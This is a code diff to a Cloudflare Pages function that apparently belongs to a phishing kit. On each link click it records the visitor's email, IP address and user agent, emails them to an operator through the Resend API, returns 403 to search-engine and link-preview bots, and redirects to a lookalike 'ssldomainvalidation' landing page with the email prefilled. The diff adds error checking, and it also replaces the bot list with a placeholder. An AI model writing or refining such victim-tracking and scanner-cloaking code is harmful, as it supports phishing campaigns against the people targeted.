@@ -4,37 +4,43 @@ export async function onRequestGet(context) {
   const ip = context.request.headers.get("CF-Connecting-IP") || "unknown";
   const ua = context.request.headers.get("User-Agent") || "unknown";
 
-  // Bot detection
-  const knownBots = [
-    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot",
-    "facebookexternalhit", "Twitterbot", "Slackbot"
-  ];
+  // Bot detection (basic - improve if critical)
+  const knownBots = [ /* ... */ ];
   const isBot = knownBots.some(bot => ua.includes(bot)) || ua === "unknown";
-
   if (isBot) {
     return new Response("Bot access denied", { status: 403 });
   }
 
-  // Send tracking email (you should use a secure API key via environment variable)
+  const recipientEmail = context.env.RECIPIENT_EMAIL; // Get from env
+
+  let emailSent = true; // Track success/failure
   try {
-    await fetch("https://api.resend.com/emails", {
+    const res = await fetch("https://api.resend.com/emails", {
       method: "POST",
       headers: {
-        Authorization: `Bearer ${context.env.RESEND_API_KEY}`, // use environment variable
+        Authorization: `Bearer ${context.env.RESEND_API_KEY}`,
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
         from: "no-reply@on.resend.dev",
-        to: "benitocalvin@yandex.com",
+        to: recipientEmail, // Use env variable
         subject: "🔔 Link Clicked",
         text: `Email: ${email}\nIP: ${ip}\nUA: ${ua}\nTime: ${new Date().toISOString()}`,
       }),
     });
+
+     if (!res.ok) { // Check the response status!
+        emailSent = false;
+        console.error("Resend API error:", await res.text(), res.status); // Log full error
+     }
+
   } catch (err) {
+    emailSent = false;
     console.error("Error sending email:", err);
+    //  Consider retrying here (using a library or setTimeout)
   }
 
-  // Redirect human to landing page with email in query
-  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}`;
+  // Redirect with status
+  const redirectUrl = `https://ssldomainvalidation.pages.dev?email=${encodeURIComponent(email)}&emailSent=${emailSent}`;
   return Response.redirect(redirectUrl, 302);
 }
